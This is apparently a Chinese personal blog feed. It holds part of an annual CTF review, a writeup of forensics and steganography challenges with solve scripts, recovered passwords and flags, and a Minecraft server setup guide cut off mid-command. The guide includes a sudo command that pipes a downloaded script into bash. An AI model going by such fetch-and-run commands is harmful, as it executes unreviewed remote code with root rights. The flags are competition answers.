毕竟往年的题都是zysgmzb学长出的，这题目质量相较往年肯定一下子就下来了:(</p><p>这一届小登有几个还是挺强的，比我去年同期强多了，邮专校队又有希望了:)</p><h3 id="强网拟态初赛"><a href="#强网拟态初赛" class="headerlink" title="强网拟态初赛"></a>强网拟态初赛</h3><p>wp: <a href="https://www.blog.st4rr.top/2024/10/21/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-%E5%88%9D%E8%B5%9BMisc-Writeup-%E5%A4%8D%E7%8E%B0/">点我</a></p><p>跟校队打的，贡献了一道crypto，两道misc:)</p><p>还有两道misc有点脑洞，实在想不到<del>（是我太菜了）</del></p><p>未晋级:(</p><h3 id="ByteCTF决赛"><a href="#ByteCTF决赛" class="headerlink" title="ByteCTF决赛"></a>ByteCTF决赛</h3><p>全靠学长，纯去北京玩了一趟()</p><img src="/images/2024年度总结/94850E62CF9F2AC2207DFD07D86C849D.png" alt="94850E62CF9F2AC2207DFD07D86C849D" style="zoom: 25%;" /><h3 id="BuildCTF"><a href="#BuildCTF" class="headerlink" title="BuildCTF"></a>BuildCTF</h3><p>wp: <a href="https://www.blog.st4rr.top/2024/10/29/BuildCTF2024-Writeup/">点我</a></p><p>就花了一晚上看一看<del>，妄想着冲冲分</del></p><h2 id="11月"><a href="#11月" class="headerlink" title="11月"></a>11月</h2><h3 id="强网杯初赛"><a href="#强网杯初赛" class="headerlink" title="强网杯初赛"></a>强网杯初赛</h3><p>wp: <a href="https://www.blog.st4rr.top/2024/11/05/%E5%BC%BA%E7%BD%91%E6%9D%AF2024-Misc-%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5-0-Writeup/">点我</a></p><p>跟星盟预备队打的，贡献了一个misc，另有一个misc是跟aura爷一起做的，aura贡献比较大，我就没写wp<del>（我懒）</del></p><p>又见识到了新题型:)</p><p>这次排名是第60名，对预备队来说其实挺不错的，可惜还是未晋级</p><h3 id="网鼎杯初赛"><a href="#网鼎杯初赛" class="headerlink" title="网鼎杯初赛"></a>网鼎杯初赛</h3><p>跟星盟预备队报的玄武组，你猜这里我为什么没放wp，诶，我爆零了</p><p>:(</p><p>其实这把我应该跟校队报青龙组的，听说挺容易晋级的。而玄武组是人数多，晋级名额又少。</p><p>:(</p><h3 id="美亚杯线下赛"><a href="#美亚杯线下赛" class="headerlink" title="美亚杯线下赛"></a>美亚杯线下赛</h3><p>跟校队的1n1t和w8nn9z师傅一起去厦门打了美亚杯的线下赛。</p><p>然而我太菜了，个人资格赛环节就被淘汰了:( 总结一下原因，我做题速度太慢了，而且准备不充分，当时对手机取证还是过于生疏所以浪费了大量的时间。</p><p>幸亏另外两位师傅比较给力，仅凭两个人在团体赛中还是拿了个三等奖Orz</p><p>明年再来，一雪前耻。</p><img src="/images/2024年度总结/IMG_4636.JPG" alt="IMG_4636" style="zoom:25%;" /><img src="/images/2024年度总结/IMG_4634.JPG" alt="IMG_4634" style="zoom: 50%;" /><p><img src="/images/2024%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/7D8B5131-79D1-4DA6-BB91-54B63C523B1E-2027-0000010.jpg" alt="7D8B5131-79D1-4DA6-BB91-54B63C523B1E-2027-0000010"></p><h3 id="极客大挑战"><a href="#极客大挑战" class="headerlink" title="极客大挑战"></a>极客大挑战</h3><p>wp: <a href="https://www.blog.st4rr.top/2024/11/19/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982024-Writeup/">点我</a></p><p>跟w8nn9z一起组队打了极客大挑战，打爽了，拿了个三等奖</p><p>题挺不错的，又学到了</p><p><img src="/images/2024%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/image-20250122175410977.png" alt="image-20250122175410977"></p><h3 id="升入星盟主队Polaris"><a href="#升入星盟主队Polaris" class="headerlink" title="升入星盟主队Polaris"></a>升入星盟主队Polaris</h3><p>根据星盟的考核标准，我尝试申请了升队。</p><p>经过考核，没想到真的成功了，就此加入了星盟主队，成为了正式成员。</p><p><del>也许是星盟对misc手还是比较缺吧</del></p><h2 id="12月"><a href="#12月" class="headerlink" title="12月"></a>12月</h2><h3 id="吾杯"><a href="#吾杯" class="headerlink" title="吾杯"></a>吾杯</h3><p>wp: <a href="https://www.blog.st4rr.top/2024/12/05/%E5%90%BE%E6%9D%AF2024-Writeup/">点我</a></p><p>个人赛，打着玩玩</p><p>给的获奖名额特别多，拿了个二等奖</p><p>![屏幕截图 2025-01-22 172551](&#x2F;images&#x2F;2024年度总结&#x2F;屏幕截图 2025-01-22 172551.png)</p><h3 id="国城杯初赛"><a href="#国城杯初赛" class="headerlink" title="国城杯初赛"></a>国城杯初赛</h3><p>wp: <a href="https://www.blog.st4rr.top/2024/12/07/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/">点我</a></p><p>跟校队的几位师傅一起打的，这时候我们有了密码手。</p><p>这个比赛的难度还可以，比较适合我们食用。但可惜的是，这个比赛的pwn从解题人数来看应该都不难，加上这几题的分我们完全可以晋级，而我们缺的就是pwn手。。。因此，我们又与晋级失之交臂。</p><p>有两个misc没做出来，复现了，学到了。</p><h3 id="cn-fnst"><a href="#cn-fnst" class="headerlink" title="cn-fnst"></a>cn-fnst</h3><p>wp: <a href="https://www.blog.st4rr.top/2024/12/15/cn-fnst2024-Writeup/">点我</a></p><p>跟两个小登一起打的cn-fnst，我做了个占分比较高的题直接给干到第三名了，拿了个二等奖</p><img src="/images/2024年度总结/龙鳞小队.png" alt="龙鳞小队" style="zoom: 25%;" /><p><del>不是你奖我个这个(?</del></p><img src="/images/2024年度总结/IMG_5418.JPG" alt="IMG_5418" style="zoom:25%;" /><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>写完上面的年度报告，突然感觉自己初入网安这一年的进步具象化起来，很高兴能看到自己逐步踏入网安的门槛。</p><p>不过宏观来看，我仍然只是个网安萌新，我看到的甚至还不到冰山的一角。我仍然需要不断地学习进步，磨练自己的技术。</p><p>未来的一年，希望我能够拿到一些大比赛的奖，在比赛中多做出一点贡献。另外，感觉光打misc对于网安来说是远远不够的，我必须再学一门其他方向，目前暂定web吧，想学点具有实战意义的东西。</p><p>下面再贴一张我在交星盟年报时做的个人技能树吧。</p><img src="/images/2024年度总结/2024年度总结.jpg" alt="2024年度总结" style="zoom: 25%;" />]]></content>
      
      
      <categories>
          
          <category> Life </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 年度总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cn-fnst2024 Writeup</title>
      <link href="/posts/539449f8/"/>
      <url>/posts/539449f8/</url>
      
        <content type="html"><![CDATA[<blockquote><p><del>小登们带我飞</del></p></blockquote><p><a href="https://www.blog.st4rr.top/writeups/cn-fnst2024Writeup.pdf">Wrtieup</a></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> cn-fnst </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>国城杯2024 Writeup</title>
      <link href="/posts/e40160ef/"/>
      <url>/posts/e40160ef/</url>
      
        <content type="html"><![CDATA[<blockquote><p>这次跟校队的几位同届的大师傅一起打的，师傅们都很强，又是被师傅们带着冲的一集。可惜我们缺个pwn手，这次的pwn从解题人数来看应该不难，但是我们一题都没做。。。</p></blockquote><h2 id="Writeup部分"><a href="#Writeup部分" class="headerlink" title="Writeup部分"></a>Writeup部分</h2><h4 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a><a href="https://www.blog.st4rr.top/writeups/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024Writeup.pdf">Writeup</a></h4><h2 id="复现部分"><a href="#复现部分" class="headerlink" title="复现部分"></a>复现部分</h2><blockquote><p>不懂的还是太多了，好好复现一下吧。</p></blockquote><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="Just-F0r3n51Cs"><a href="#Just-F0r3n51Cs" class="headerlink" title="Just_F0r3n51Cs"></a>Just_F0r3n51Cs</h4><blockquote><p>这题当时是找到了第三第四个flag，第一个flag找到了密钥但是没找到密文。</p></blockquote><h5 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h5><p>在桌面上可以找到beginning.pcapng</p><p><img src="/images/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/image-20241207185904257.png" alt="image-20241207185904257"></p><p>追踪一下http流可以看到传输了一张jpg图片，保存下来</p><p><img src="/images/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/image-20241207190018698.png" alt="image-20241207190018698"></p><p>图片结尾有一串base64</p><p><img src="/images/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/image-20241207190302519.png" alt="image-20241207190302519"></p><p>解出来提示oursecret，用oursecret提取得到hidden.txt</p><p><img src="/images/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/image-20241207190353388.png" alt="image-20241207190353388"></p><p><img src="/images/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/image-20241207190505330.png" alt="image-20241207190505330"></p><p>内容如下</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ECB&#x27;s key is</span><br><span class="line">N11c3TrYY6666111</span><br><span class="line">记得给我秋秋空间点赞</span><br></pre></td></tr></table></figure><p>查看流量包中的oicq流，可以看到一个QQ号</p><p><img src="/images/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/image-20241207190631379.png" alt="image-20241207190631379"></p><p>看一下其空间，找到密文</p><img src="/images/国城杯2024-Writeup/FEFD121B2F9676AB28DFE7834E11BB28.png" alt="FEFD121B2F9676AB28DFE7834E11BB28" style="zoom:50%;" /><p><img src="/images/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/image-20241207190927635.png" alt="image-20241207190927635"></p><h5 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h5><p>找到SYSTEM，右键解析注册表</p><p><img src="/images/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/image-20241207191051755.png" alt="image-20241207191051755"></p><p>查看环境变量，找到第二个flag存放的路径，前往将其导出</p><p><img src="/images/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/image-20241207191309431.png" alt="image-20241207191309431"></p><p>文件名字叫2，但是从特征不难发现这是个压缩包，有注释。</p><p><img src="/images/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/image-20241207191511072.png" alt="image-20241207191511072"></p><p>根据要求找到相关信息，得到密码D0g3xGC_Windows_7_Ultimate_115.0</p><p><img src="/images/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/image-20241207192038615.png" alt="image-20241207192038615"></p><p><img src="/images/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/image-20241207192104491.png" alt="image-20241207192104491"></p><p>base85</p><p><img src="/images/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/image-20241207192304255.png" alt="image-20241207192304255"></p><h5 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h5><p>不难找到original.zip，到处都是它的痕迹。同时在图片文件夹下可以找到一张特殊的图片。</p><p><img src="/images/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/image-20241207192522212.png" alt="image-20241207192522212"></p><p>压缩包有注释</p><p><img src="/images/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/image-20241207192609657.png" alt="image-20241207192609657"></p><p>根据要求找到相关信息，得到密码qwe123!@#_Y0u_f1Nd^_^m3_233</p><p><img src="/images/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/image-20241207192723500.png" alt="image-20241207192723500"></p><p><img src="/images/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/image-20241207192801229.png" alt="image-20241207192801229"></p><p><img src="/images/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/image-20241207192901376.png" alt="image-20241207192901376"></p><p>根据水印图片的名字CatWaterMark_666.png可知，用github上的<a href="https://github.com/Konano/CatWatermark">这个工具</a>提取盲水印，参数为666</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python decode.py Original.png CatWaterMark_666.png output.png 6 6 6</span><br></pre></td></tr></table></figure><p><img src="/images/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/image-20241207193442527.png" alt="image-20241207193442527"></p><h5 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h5><p>不难找到flag4.zip，到处都是它的痕迹。</p><p><img src="/images/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/image-20241207193653243.png" alt="image-20241207193653243"></p><p>flag4.zip里面有个python打包的exe和一个加密的bin文件，python逆向一下</p><p><img src="/images/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/image-20241207194149584.png" alt="image-20241207194149584"></p><p><img src="/images/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/image-20241207194230130.png" alt="image-20241207194230130"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.9.1</span></span><br><span class="line"><span class="comment"># Python bytecode version base 3.8.0 (3413)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 3.10.11 (tags/v3.10.11:7d4cc5a, Apr  5 2023, 00:38:17) [MSC v.1929 64 bit (AMD64)]</span></span><br><span class="line"><span class="comment"># Embedded file name: enc_png.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_encrypt</span>(<span class="params">data, key</span>):</span><br><span class="line">    encrypted_data = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">        encrypted_data.append(data[i] ^ key[i % <span class="built_in">len</span>(key)])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> encrypted_data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_file</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        data = file.read()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_file</span>(<span class="params">file_path, data</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file.write(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_file</span>(<span class="params">input_file_path, output_file_path, key</span>):</span><br><span class="line">    data = read_file(input_file_path)</span><br><span class="line">    encrypted_data = xor_encrypt(data, key)</span><br><span class="line">    write_file(output_file_path, encrypted_data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    key = <span class="string">b&#x27;GCcup_wAngwaNg!!&#x27;</span></span><br><span class="line">    input_file = <span class="string">&quot;flag4.png&quot;</span></span><br><span class="line">    encrypted_file = <span class="string">&quot;flag4_encrypted.bin&quot;</span></span><br><span class="line">    encrypt_file(input_file, encrypted_file, key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># okay decompiling enc_png.pyc</span></span><br></pre></td></tr></table></figure><p>什么都不用改就能解密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">xor_decrypt</span>(<span class="params">data, key</span>):</span><br><span class="line">    encrypted_data = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">        encrypted_data.append(data[i] ^ key[i % <span class="built_in">len</span>(key)])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> encrypted_data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_file</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        data = file.read()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_file</span>(<span class="params">file_path, data</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file.write(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_file</span>(<span class="params">input_file_path, output_file_path, key</span>):</span><br><span class="line">    data = read_file(input_file_path)</span><br><span class="line">    decrypted_data = xor_decrypt(data, key)</span><br><span class="line">    write_file(output_file_path, decrypted_data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    key = <span class="string">b&#x27;GCcup_wAngwaNg!!&#x27;</span></span><br><span class="line">    input_file = <span class="string">&quot;flag4_encrypted.bin&quot;</span></span><br><span class="line">    decrypted_file = <span class="string">&quot;flag4.png&quot;</span></span><br><span class="line">    decrypt_file(input_file, decrypted_file, key)</span><br></pre></td></tr></table></figure><p>flag4.png:</p><p><img src="/images/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/asynccode" alt="img"></p><p>合起来</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D0g3xGC&#123;Y0u_h4V3_f0und_7H3_F1N4L_s3CR3t_0F_Th15_F0R3N51c5_Ch4Ll3N93&#125;</span><br></pre></td></tr></table></figure><h4 id="eZ-Steg0"><a href="#eZ-Steg0" class="headerlink" title="eZ_Steg0"></a>eZ_Steg0</h4><p>图片名叫01.png，写个python脚本遍历每个像素，黑色记为0，白色记为1，输出二进制字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">image_to_binary_string</span>(<span class="params">image_path, threshold=<span class="number">127</span></span>):</span><br><span class="line">    <span class="keyword">with</span> Image.<span class="built_in">open</span>(image_path) <span class="keyword">as</span> img:</span><br><span class="line">        img = img.convert(<span class="string">&#x27;L&#x27;</span>)</span><br><span class="line">        binary_string = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(img.height):</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(img.width):</span><br><span class="line">                pixel_value = img.getpixel((x, y))</span><br><span class="line">                <span class="keyword">if</span> pixel_value &lt; threshold:</span><br><span class="line">                    binary_string += <span class="string">&quot;0&quot;</span> </span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    binary_string += <span class="string">&quot;1&quot;</span> </span><br><span class="line">    <span class="keyword">return</span> binary_string.strip() </span><br><span class="line">image_path = <span class="string">&#x27;01.png&#x27;</span> </span><br><span class="line">result_string = image_to_binary_string(image_path)</span><br><span class="line"><span class="built_in">print</span>(result_string)</span><br></pre></td></tr></table></figure><p>cyberchef转换一下，删去一些0以后发现结尾有倒着的png头</p><p><img src="/images/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/image-20241209184653844.png" alt="image-20241209184653844"></p><p>处理一下保存为png</p><p><img src="/images/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/image-20241209184747610.png" alt="image-20241209184747610"></p><p><img src="/images/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/image-20241209185016483.png" alt="image-20241209185016483"></p><p>这就是key.zip的密码。解压得到的key开头有段base64</p><p><img src="/images/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/image-20241209185254500.png" alt="image-20241209185254500"></p><p><img src="/images/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/image-20241209185317446.png" alt="image-20241209185317446"></p><p>提示了这是一个stl文件，删去开头的base64，修改后缀名为.stl，用<a href="https://www.3dpea.com/cn/view-STL-online">这个网站</a>查看，即可看到key</p><p><img src="/images/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/image-20241209185656525.png" alt="image-20241209185656525"></p><p>用这个key去对不知道是什么东西的flag文件异或一下，可以得到一个wav文件</p><p><img src="/images/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/image-20241209185954584.png" alt="image-20241209185954584"></p><p>提取<a href="https://sumit-arora.medium.com/audio-steganography-the-art-of-hiding-secrets-within-earshot-part-2-of-2-c76b1be719b3">音频lsb隐写</a>，得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> wave</span><br><span class="line">song = wave.<span class="built_in">open</span>(<span class="string">&quot;download.wav&quot;</span>, mode=<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line"><span class="comment"># Convert audio to byte array</span></span><br><span class="line">frame_bytes = <span class="built_in">bytearray</span>(<span class="built_in">list</span>(song.readframes(song.getnframes())))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Extract the LSB of each byte</span></span><br><span class="line">extracted = [frame_bytes[i] &amp; <span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(frame_bytes))]</span><br><span class="line"><span class="comment"># Convert byte array back to string</span></span><br><span class="line">string = <span class="string">&quot;&quot;</span>.join(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="string">&quot;&quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>,extracted[i:i+<span class="number">8</span>])),<span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(extracted),<span class="number">8</span>))</span><br><span class="line"><span class="comment"># Cut off at the filler characters</span></span><br><span class="line">decoded = string.split(<span class="string">&quot;###&quot;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Print the extracted text</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Sucessfully decoded: &quot;</span>+decoded)</span><br><span class="line">song.close()</span><br></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D0g3xGC&#123;U_4rE_4_WhI2_4t_Ste9An09r4pHY&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> 国城杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MC服务器搭建</title>
      <link href="/posts/9deebcb5/"/>
      <url>/posts/9deebcb5/</url>
      
        <content type="html"><![CDATA[<blockquote><p>记录一下我唯一玩、最热爱的游戏MC服务器的搭建，这里使用的是MCSManager</p><p>随着使用的深入，后续会添加更多</p></blockquote><p>这里使用到的：一台带有公网ip的ubuntu22.04-x64系统服务器、<a href="https://github.com/MCSManager/MCSManager">MCSManager面板</a>，我们要安装的是java1.21.4-Fabric版本</p><h2 id="预操作"><a href="#预操作" class="headerlink" title="预操作"></a>预操作</h2><p>先进行一些经典操作</p><h3 id="更新软件源"><a href="#更新软件源" class="headerlink" title="更新软件源"></a>更新软件源</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt update</span><br></pre></td></tr></table></figure><h3 id="开放端口"><a href="#开放端口" class="headerlink" title="开放端口"></a>开放端口</h3><p>启动防火墙，开放端口，下面我们会用到的是23333、24444和25565端口，特别要注意的是别忘了开放自己ssh所用的端口，这里我使用的是49578端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ufw <span class="built_in">enable</span></span><br><span class="line">ufw allow 23333/tcp 24444/tcp 25565/tcp 49578/tcp</span><br><span class="line">ufw status         <span class="comment">#检查已开放端口</span></span><br></pre></td></tr></table></figure><h2 id="安装java"><a href="#安装java" class="headerlink" title="安装java"></a>安装java</h2><p>由于我们要安装的是1.21.4版，因此需要安装对应的java21的环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install openjdk-21-jdk</span><br><span class="line">java -version      <span class="comment">#检查是否安装成功</span></span><br></pre></td></tr></table></figure><h2 id="面板安装"><a href="#面板安装" class="headerlink" title="面板安装"></a>面板安装</h2><h3 id="一键安装"><a href="#一键安装" class="headerlink" title="一键安装"></a>一键安装</h3><p>官方给出的一键安装方法（实测国内服务器可用）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo su -c <span class="string">&quot;wget -qO- https://script.mcsmanager.com/setup.sh | bash&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/images/MC%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/image-20241205194127608.png" alt="image-20241205194127608"></p><h3 id="手动安装"><a href="#手动安装" class="headerlink" title="手动安装"></a>手动安装</h3><p>官方给出的手动安装方法（没测过）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Create /opt directory if not already</span></span><br><span class="line"><span class="built_in">mkdir</span> /opt</span><br><span class="line"><span class="comment"># Switch to /opt</span></span><br><span class="line"><span class="built_in">cd</span> /opt/</span><br><span class="line"><span class="comment"># Download Node.js 20.11. If you already have Node.js 16+ installed, ignore this step.</span></span><br><span class="line">wget https://nodejs.org/dist/v20.11.0/node-v20.11.0-linux-x64.tar.xz</span><br><span class="line"><span class="comment"># Decompress Node.js source</span></span><br><span class="line">tar -xvf node-v20.11.0-linux-x64.tar.xz</span><br><span class="line"><span class="comment"># Add Node.js to system PATH</span></span><br><span class="line"><span class="built_in">ln</span> -s /opt/node-v20.11.0-linux-x64/bin/node /usr/bin/node</span><br><span class="line"><span class="built_in">ln</span> -s /opt/node-v20.11.0-linux-x64/bin/npm /usr/bin/npm</span><br><span class="line"></span><br><span class="line"><span class="comment"># Prepare MCSM&#x27;s installation directory</span></span><br><span class="line"><span class="built_in">mkdir</span> 